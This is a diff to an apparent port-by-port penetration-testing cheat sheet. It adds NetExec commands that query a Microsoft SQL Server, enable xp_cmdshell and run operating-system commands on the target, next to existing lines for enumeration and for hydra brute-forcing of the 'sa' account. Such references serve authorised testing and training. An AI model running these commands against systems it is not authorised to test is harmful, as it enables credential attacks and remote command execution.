@@ -234,6 +234,10 @@ Other modules:
   `nmap -sV --script=ms-sql-info,ms-sql-ntlm-info <target> -p1433` (pre-installed).  
   `impacket-mssqlclient <user>@<target>` (Impacket install as above).  
   `hydra -l sa -P <wordlist> <target> mssql` (brute; pre-installed).
+  `nxc mssql <target> -u user -p pass -q 'SELECT @@VERSION' (get version)
+  Enable & use xp_cmdshell:  
+  `nxc mssql <target> -u user -p pass --enable-xp  
+  `nxc mssql <target> -u user -p pass -X 'whoami'  (after enable)
 
 - **1521/TCP - Oracle** (info disclosure, SID brute, TNS poisoning):  
   `tnscmd10g version -h <target>` (install via `git clone https://github.com/irsdl/tnscmd10g`).  
